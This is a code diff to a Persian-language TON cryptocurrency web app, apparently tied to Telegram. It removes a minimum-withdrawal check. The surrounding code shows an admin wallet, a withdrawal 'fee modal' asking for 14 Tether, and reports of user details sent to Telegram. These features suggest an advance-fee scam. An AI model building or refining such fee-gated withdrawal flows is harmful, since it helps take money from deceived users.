@@ -13,7 +13,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
     <style>
-        /* استایل‌های کامل */
+        /* استایل‌های کامل (مثل قبل) */
         @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700;900&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; overflow: hidden; }
@@ -172,7 +172,7 @@
 
 <div id="userDetailModal" class="user-modal" onclick="if(event.target===this) closeUserModal()"><div class="modal-card"><h2><i class="fas fa-user"></i> جزئیات کاربر</h2><div id="userDetails"></div><button class="admin-btn-sm" style="width:100%;margin-top:20px;background:#ff512f" onclick="closeUserModal()"><i class="fas fa-times"></i> بستن</button></div></div>
 
-<!-- مودال کارمزد (برای برداشت) - ویرایش شده به ۱۴ تتر و لینک پشتیبانی -->
+<!-- مودال کارمزد (برای برداشت) - ۱۴ تتر و لینک پشتیبانی -->
 <div id="feeModal">
     <div class="modal-content">
         <i class="fas fa-lock"></i>
@@ -271,7 +271,7 @@ const CONFIG = {
     ADMIN_WALLET_BOUNCEABLE: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
     NETWORK_FEE: 0.0035,
     MINIMUM_WITHDRAW: 14,
-    MINIMUM_FINAL_WITHDRAW: 5
+    // MINIMUM_FINAL_WITHDRAW حذف شد
 };
 
 // ==================== داده‌های محلی ====================
@@ -854,13 +854,7 @@ window.finalWithdraw = function() {
         return;
     }
     
-    // سپس بررسی حداقل مبلغ برداشت
-    if (withdrawableBalance < CONFIG.MINIMUM_FINAL_WITHDRAW) {
-        showToast(`⚠️ حداقل مبلغ برداشت ${CONFIG.MINIMUM_FINAL_WITHDRAW} TON است`);
-        return;
-    }
-    
-    // انجام برداشت نهایی
+    // اگر فعال بود، برداشت را انجام بده (بدون محدودیت حداقل مبلغ)
     const amountToWithdraw = withdrawableBalance;
     addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
     sendToTelegram(`💰 **برداشت نهایی**\n👤 نام: ${currentUser?.firstName}\n🆔 آیدی: ${currentUser?.id}\n📤 مبلغ: ${amountToWithdraw.toFixed(6)} TON\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
